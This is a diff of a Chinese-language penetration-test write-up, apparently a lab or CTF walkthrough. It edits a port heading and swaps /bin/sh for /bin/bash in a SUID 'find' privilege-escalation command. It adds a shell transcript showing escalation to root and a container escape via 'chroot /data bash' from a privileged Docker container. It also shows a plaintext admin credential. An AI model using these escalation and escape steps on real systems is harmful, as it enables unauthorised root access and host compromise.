@@ -195,7 +195,7 @@ username:Nss-admin
 password:Ax2Xwz1@x*Xs1I
 ```
 
-## Port 134 禅道
+## Port 80 禅道
 
 使用在 Solr 得到的凭据，登录禅道
 
@@ -301,7 +301,7 @@ www-data
 尝试利用 `find` 实现提权到 root
 
 ```shell
-(remote) www-data@873c2ec0dbeb:/tmp$ find . -exec /bin/sh -p \; -quit
+(remote) www-data@873c2ec0dbeb:/tmp$ find . -exec /bin/bash -p \; -quit
 (remote) root@873c2ec0dbeb:/tmp$ whoami
 root
 ```
@@ -464,3 +464,33 @@ docker run -d -v /:/data -p 80:80 -e MYSQL_INTERNAL=true --privileged=true 41101
 ```
 
 那就不用多说了，都是特权容器
+
+```shell
+# 未提权
+(remote) www-data@873c2ec0dbeb:/$ whoami; hostname
+www-data
+873c2ec0dbeb
+
+# 提权后
+(remote) www-data@873c2ec0dbeb:/$ find . -exec /bin/bash -p \; -quit
+(remote) root@873c2ec0dbeb:/# whoami; hostname
+root
+873c2ec0dbeb
+
+# 逃逸后
+(remote) root@873c2ec0dbeb:/# chroot /data bash
+(remote) www-data@873c2ec0dbeb:/$ whoami; hostname; hostnamectl
+www-data
+873c2ec0dbeb
+   Static hostname: ubuntu
+         Icon name: computer-vm
+           Chassis: vm
+        Machine ID: 2814c549570d4292b2f23c079b91b932
+           Boot ID: 930d846870794195ad287c500051e2a3
+    Virtualization: vmware
+  Operating System: Ubuntu 20.04 LTS
+            Kernel: Linux 5.15.0-134-generic
+      Architecture: x86-64
+```
+
+Linux 一切皆为文件，所以可以视作逃逸完成
